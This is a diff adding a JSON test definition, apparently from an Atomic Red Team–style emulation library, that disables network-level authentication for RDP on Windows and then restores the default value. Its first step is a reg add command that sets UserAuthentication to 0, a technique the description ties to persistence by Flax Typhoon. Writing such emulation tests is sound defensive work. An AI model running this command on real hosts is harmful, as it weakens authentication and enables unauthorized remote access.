@@ -1,0 +1,52 @@
+{
+  "id": "01d1c6c0-faf0-408e-b368-752a02285cb2",
+  "name": "Disable NLA for RDP via Command Prompt",
+  "description": "Disables network-level authentication (NLA) for RDP by changing a registry key via Command Prompt\nDisabling NLA for RDP can allow remote user interaction with the Windows sign-in screen prior to authentication. According to Microsoft, Flax Typhoon actors used this technique implementation to achieve persistence on victim systems: https://www.microsoft.com/en-us/security/blog/2023/08/24/flax-typhoon-using-legitimate-software-to-quietly-access-taiwanese-organizations/\nSee also: https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/management/enable_rdp.py\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "a60b0f78-3b21-4690-8944-a2635fcf6a8e",
+      "type": "execute-command",
+      "data": {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d 0 /t REG_DWORD /f\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "459a30c0-e2b3-4438-9d5e-9e56111753d2",
+      "type": "execute-command",
+      "data": {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d #{Default_UserAuthentication} /t REG_DWORD -f \u003enul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "a60b0f78-3b21-4690-8944-a2635fcf6a8e",
+      "p": "on-success",
+      "o": "459a30c0-e2b3-4438-9d5e-9e56111753d2"
+    },
+    {
+      "s": "a60b0f78-3b21-4690-8944-a2635fcf6a8e",
+      "p": "on-failure",
+      "o": "459a30c0-e2b3-4438-9d5e-9e56111753d2"
+    }
+  ],
+  "tags": [
+    "T1021.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "Default_UserAuthentication",
+      "type": "string",
+      "description": "Default UserAuthentication registry value",
+      "value": "1"
+    }
+  ]
+}
